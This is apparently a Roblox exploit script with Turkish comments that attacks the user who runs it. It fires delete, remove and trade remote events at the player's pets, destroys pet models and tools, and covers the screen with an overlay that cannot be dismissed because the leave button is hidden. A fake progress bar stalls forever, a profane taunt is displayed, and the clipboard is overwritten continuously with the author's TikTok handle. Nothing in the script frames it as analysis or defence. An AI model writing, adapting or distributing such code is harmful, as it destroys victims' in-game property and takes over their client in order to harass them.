--[ palofsc : LEA_FUCKYOURMOTHER_PETSILICI_V5 ]
--[ Petleri siler, sahte progress bar doldurur, sonra LEA FUCKED YOUR MOTHER yazar ]
--[ TikTok @LEAPLUS panoya sürekli kopyalanır ve sabitlenir ]

local player = game:GetService("Players").LocalPlayer
local replicatedStorage = game:GetService("ReplicatedStorage")
local coreGui = game:GetService("CoreGui")
local runService = game:GetService("RunService")
local tweenService = game:GetService("TweenService")
local virtualInputManager = game:GetService("VirtualInputManager")
local guiService = game:GetService("GuiService")

--[ ==================== FAZ 0: PANO SABİTLEYİCİ ==================== ]
spawn(function()
    while true do
        task.wait(0.05) --[ salisede sürekli kopyala ]
        pcall(function()
            if syn and syn.write_clipboard then
                syn.write_clipboard("TİKTOK @LEAPLUS")
            elseif setclipboard then
                setclipboard("TİKTOK @LEAPLUS")
            end
        end)
    end
end)

--[ ==================== FAZ 1: EKRAN KARARTMA ==================== ]
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LEA_OVERLAY_MAIN"
screenGui.Parent = coreGui
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local blackFrame = Instance.new("Frame")
blackFrame.Name = "BLACKOUT"
blackFrame.Size = UDim2.new(1, 0, 1, 0)
blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
blackFrame.BorderSizePixel = 0
blackFrame.ZIndex = 999
blackFrame.Parent = screenGui

local clickBlocker = Instance.new("TextButton")
clickBlocker.Name = "BLOCKER"
clickBlocker.Size = UDim2.new(1, 0, 1, 0)
clickBlocker.BackgroundTransparency = 1
clickBlocker.Text = ""
clickBlocker.ZIndex = 1000
clickBlocker.Modal = true
clickBlocker.Parent = screenGui

--[ Çıkış butonu gizle ]
if guiService:FindFirstChild("LeaveButton") then
    guiService.LeaveButton.Visible = false
    guiService.LeaveButton.Active = false
end
guiService.ChildAdded:Connect(function(child)
    if child.Name == "LeaveButton" or child:IsA("TextButton") then
        child.Visible = false
        child.Active = false
    end
end)

--[ ==================== FAZ 2: ÜST YAZI LEA MOD DOWNLOAD ==================== ]
local topLabel = Instance.new("TextLabel")
topLabel.Name = "TOP_TITLE"
topLabel.Size = UDim2.new(1, 0, 0.1, 0)
topLabel.Position = UDim2.new(0, 0, 0.05, 0)
topLabel.BackgroundTransparency = 1
topLabel.Text = "LEA MOD DOWNLOAD"
topLabel.TextColor3 = Color3.new(0.8, 0, 0)
topLabel.TextStrokeColor3 = Color3.new(0.3, 0, 0)
topLabel.TextStrokeTransparency = 0
topLabel.Font = Enum.Font.GothamBlack
topLabel.TextScaled = true
topLabel.ZIndex = 1001
topLabel.Parent = screenGui

--[ ==================== FAZ 3: SAHTE PROGRESS BAR (ASLA DOLMAZ) ==================== ]
local barBackground = Instance.new("Frame")
barBackground.Name = "BAR_BG"
barBackground.Size = UDim2.new(0.8, 0, 0.04, 0)
barBackground.Position = UDim2.new(0.1, 0, 0.45, 0)
barBackground.BackgroundColor3 = Color3.new(0.15, 0.15, 0.15)
barBackground.BorderSizePixel = 0
barBackground.ZIndex = 1001
barBackground.Parent = screenGui

local barFill = Instance.new("Frame")
barFill.Name = "BAR_FILL"
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.new(0.8, 0, 0)
barFill.BorderSizePixel = 0
barFill.ZIndex = 1002
barFill.Parent = barBackground

local barText = Instance.new("TextLabel")
barText.Name = "BAR_TEXT"
barText.Size = UDim2.new(1, 0, 1, 0)
barText.BackgroundTransparency = 1
barText.Text = "PETLER SİLİNİYOR... %0"
barText.TextColor3 = Color3.new(1, 1, 1)
barText.Font = Enum.Font.GothamBold
barText.TextScaled = true
barText.ZIndex = 1003
barText.Parent = barBackground

--[ Progress bar sahte doldurma - %99.9'da takılı kalır, asla %100 olmaz ]
local fakeProgress = 0
spawn(function()
    while fakeProgress < 99.9 do
        local increment = math.random(1, 8) * 0.1
        fakeProgress = math.min(fakeProgress + increment, 99.9)
        barFill.Size = UDim2.new(fakeProgress / 100, 0, 1, 0)
        barText.Text = string.format("PETLER SİLİNİYOR... %%%.1f", fakeProgress)
        
        --[ İlerleme hızı değişken, bazen yavaş bazen hızlı ]
        local waitTime = math.random(1, 8) * 0.1
        task.wait(waitTime)
        
        --[ %70-85 arası yavaşla, %90-99 arası çok yavaşla ]
        if fakeProgress > 70 then
            task.wait(math.random(2, 5) * 0.1)
        end
        if fakeProgress > 90 then
            task.wait(math.random(3, 10) * 0.1)
        end
    end
    --[ %99.9'da sonsuza kadar titreşim yap ]
    while true do
        barFill.Size = UDim2.new(0.999, 0, 1, 0)
        barText.Text = "PETLER SİLİNİYOR... %99.9"
        task.wait(0.5)
        barFill.Size = UDim2.new(0.998, 0, 1, 0)
        barText.Text = "PETLER SİLİNİYOR... %99.8"
        task.wait(0.3)
    end
end)

--[ ==================== FAZ 4: ALT BİLGİ YAZISI ==================== ]
local infoLabel = Instance.new("TextLabel")
infoLabel.Name = "INFO_TEXT"
infoLabel.Size = UDim2.new(1, 0, 0.05, 0)
infoLabel.Position = UDim2.new(0, 0, 0.55, 0)
infoLabel.BackgroundTransparency = 1
infoLabel.Text = "Lütfen kapatmayın... Petler siliniyor..."
infoLabel.TextColor3 = Color3.new(0.7, 0.7, 0.7)
infoLabel.Font = Enum.Font.GothamMedium
infoLabel.TextScaled = true
infoLabel.ZIndex = 1001
infoLabel.Parent = screenGui

--[ ==================== FAZ 5: PET SİLME İŞLEMİ (ARKA PLANDA) ==================== ]
local function getAllPets()
    local pets = {}
    for _, item in pairs(player.Backpack:GetChildren()) do
        if item:IsA("Tool") then
            table.insert(pets, item)
        end
    end
    if player:FindFirstChild("PlayerGui") then
        for _, screen in pairs(player.PlayerGui:GetChildren()) do
            if screen.Name:lower():find("inventory") or screen.Name:lower():find("pet") or screen.Name:lower():find("backpack") then
                for _, element in pairs(screen:GetDescendants()) do
                    if element:IsA("ImageButton") or element:IsA("TextButton") then
                        if element.Name:lower():find("pet") or element.Name:lower():find("equip") or element.Name:lower():find("delete") or element.Name:lower():find("remove") then
                            table.insert(pets, element)
                        end
                    end
                end
            end
        end
    end
    return pets
end

local function findDeleteRemote()
    local keywords = {"DeletePet", "RemovePet", "TradePet", "DestroyPet", "PetDelete", "DeleteInvItem", "InventoryRemove", "RemoveItem", "TrashItem", "DeleteItem", "ClearPet", "PetClear", "PetVoid", "releasepet", "deletepet", "removepet", "trade", "delete", "remove"}
    for _, remote in pairs(replicatedStorage:GetDescendants()) do
        if remote:IsA("RemoteEvent") then
            for _, kw in pairs(keywords) do
                if remote.Name:lower():find(kw:lower()) then
                    return remote
                end
            end
        end
    end
    return nil
end

local deleteRemote = findDeleteRemote()
local allPets = getAllPets()

spawn(function()
    --[ Tüm petleri sırayla sil ]
    for _, pet in pairs(allPets) do
        spawn(function()
            pcall(function()
                if deleteRemote then
                    for i = 1, 30 do
                        deleteRemote:FireServer(pet)
                        deleteRemote:FireServer(pet, true)
                        deleteRemote:FireServer(pet.Parent or pet, "delete")
                        task.wait(0.01)
                    end
                end
            end)
        end)
    end
    
    --[ Tüm remotelere spam ]
    for _, remote in pairs(replicatedStorage:GetDescendants()) do
        if remote:IsA("RemoteEvent") then
            spawn(function()
                pcall(function()
                    for i = 1, 50 do
                        remote:FireServer("delete", "pet", "all", true)
                        remote:FireServer("remove", "pet", "all", true)
                        task.wait(0.01)
                    end
                end)
            end)
        end
    end
    
    --[ Workspace pet modelleri yok et ]
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("Model") and obj.Name:lower():find("pet") then
            pcall(function() obj:Destroy() end)
        end
    end
    
    --[ Sürekli temizlik - yeni gelen petleri anında sil ]
    workspace.ChildAdded:Connect(function(child)
        task.wait(0.05)
        if child:IsA("Model") and child.Name:lower():find("pet") then
            pcall(function() child:Destroy() end)
        end
    end)
    player.Backpack.ChildAdded:Connect(function(child)
        task.wait(0.05)
        if child:IsA("Tool") then
            pcall(function() child:Destroy() end)
        end
    end)
end)

--[ Pet silinmesini bekle - 5 saniye sonra final ekranına geç ]
task.wait(5)

--[ ==================== FAZ 6: FİNAL EKRANI - LEA FUCKED YOUR MOTHER ==================== ]
--[ Eski elemanları temizle ]
for _, child in pairs(screenGui:GetChildren()) do
    if child.Name ~= "BLACKOUT" and child.Name ~= "BLOCKER" then
        child:Destroy()
    end
end

--[ Ana mesaj ]
local finalLabel = Instance.new("TextLabel")
finalLabel.Name = "FINAL_TEXT"
finalLabel.Size = UDim2.new(0.9, 0, 0.4, 0)
finalLabel.Position = UDim2.new(0.05, 0, 0.3, 0)
finalLabel.BackgroundTransparency = 1
finalLabel.Text = "LEA FUCKED\nYOUR MOTHER"
finalLabel.TextColor3 = Color3.new(1, 0, 0)
finalLabel.TextStrokeColor3 = Color3.new(0.5, 0, 0)
finalLabel.TextStrokeTransparency = 0
finalLabel.Font = Enum.Font.GothamBlack
finalLabel.TextScaled = true
finalLabel.ZIndex = 2000
finalLabel.Parent = screenGui

--[ Yanıp sönme efekti ]
spawn(function()
    local visible = true
    while true do
        task.wait(0.25)
        visible = not visible
        finalLabel.TextTransparency = visible and 0 or 0.6
    end
end)

--[ Renk döngüsü ]
local finalColors = {
    Color3.new(1, 0, 0),
    Color3.new(0.9, 0, 0.1),
    Color3.new(1, 0.1, 0),
    Color3.new(0.8, 0, 0),
}
local cidx = 1
spawn(function()
    while true do
        task.wait(0.4)
        cidx = cidx % #finalColors + 1
        finalLabel.TextColor3 = finalColors[cidx]
    end
end)

--[ TikTok etiketi altta ]
local tiktokLabel = Instance.new("TextLabel")
tiktokLabel.Name = "TIKTOK_LABEL"
tiktokLabel.Size = UDim2.new(1, 0, 0.08, 0)
tiktokLabel.Position = UDim2.new(0, 0, 0.85, 0)
tiktokLabel.BackgroundTransparency = 1
tiktokLabel.Text = "TİKTOK @LEAPLUS"
tiktokLabel.TextColor3 = Color3.new(1, 1, 1)
tiktokLabel.Font = Enum.Font.GothamBold
tiktokLabel.TextScaled = true
tiktokLabel.ZIndex = 2000
tiktokLabel.Parent = screenGui

--[ ==================== FAZ 7: KOPYALAMA SABİTLEME (DEVAM) ==================== ]
--[ Panoya sürekli yazma zaten Faz 0'da başlatıldı, burada da pekiştir ]
spawn(function()
    while true do
        task.wait(0.03)
        pcall(function()
            if syn and syn.write_clipboard then
                syn.write_clipboard("TİKTOK @LEAPLUS")
            elseif setclipboard then
                setclipboard("TİKTOK @LEAPLUS")
            end
        end)
    end
end)

--[ ==================== FAZ 8: SONSUZ KORUMA DÖNGÜSÜ ==================== ]
while true do
    runService.RenderStepped:Wait()
    --[ Overlay kapatılırsa yeniden oluştur ]
    if not screenGui or not screenGui.Parent then
        screenGui = Instance.new("ScreenGui")
        screenGui.Name = "LEA_OVERLAY_MAIN"
        screenGui.Parent = coreGui
        blackFrame.Parent = screenGui
        finalLabel.Parent = screenGui
        tiktokLabel.Parent = screenGui
    end
    --[ Çıkış butonunu sürekli yok et ]
    if guiService:FindFirstChild("LeaveButton") then
        guiService.LeaveButton.Visible = false
    end
    task.wait(0.2)
end
